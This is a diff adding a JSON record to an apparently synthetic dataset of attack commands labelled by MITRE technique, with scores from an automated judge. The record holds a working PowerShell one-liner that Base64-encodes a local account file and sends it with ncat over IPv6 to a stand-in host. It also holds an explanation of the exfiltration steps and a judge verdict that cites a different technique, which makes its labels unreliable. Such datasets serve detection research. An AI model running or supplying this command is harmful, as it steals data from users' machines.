@@ -1,0 +1,36 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
+  "explanation": "Binds the exfiltration flow to the Wi-Fi IPv6 address (distinct network path) and sends Base64 data via ncat to a high, uncommon TCP port. This explicitly uses a different medium/interface than a likely primary wired channel, aligning with T1011.",
+  "rationale_steps": [
+    "Select Wi-Fi IPv6 address to force use of a different network medium/interface.",
+    "Send Base64 data via IPv6 TCP to a non-standard high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-563bdea1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, valid cmdlets and ncat flags, and correct use of pipelines and separators.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates data via ncat over IPv6 but does not use trusted signed system scripts to proxy execution (e.g., cscript/wscript with Microsoft-signed scripts), so it is not aligned with System Script Proxy Execution.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T22:16:53.821132Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
